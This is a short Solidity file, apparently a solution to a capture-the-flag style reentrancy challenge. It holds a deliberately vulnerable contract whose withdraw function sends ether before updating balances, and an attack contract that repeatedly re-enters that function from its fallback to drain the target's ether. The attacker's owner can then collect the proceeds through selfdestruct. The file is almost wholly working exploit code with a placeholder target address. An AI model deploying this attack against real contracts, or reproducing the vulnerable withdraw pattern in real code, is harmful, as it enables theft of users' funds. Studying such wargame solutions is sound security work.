pragma solidity ^0.4.18;


contract Exploits {

    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] += msg.value;
    }

    function balanceOf(address _who) public constant returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            if (msg.sender.call.value(_amount)()) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    function() payable {}
}

contract Hacking{

address contractaddr = 0xcontractaddr; //replace ffs
Exploits re;
address owner;

function Hacking() public {
    owner = msg.sender;
    re = Exploits(contractaddr);
}


function donate() public payable{
    re.donate.value(msg.value)(this);
}


function attack() public payable{
    re.withdraw(0.1 ether);
}

function our_bal() public view returns(uint){
    return address(this).balance;
}

function get_balance() public view returns(uint) {
    return re.balanceOf(this);
}

function() public payable{
    re.withdraw(0.1 ether);
}

function kill () {
    require(msg.sender == owner);
    selfdestruct(owner);
    }


}
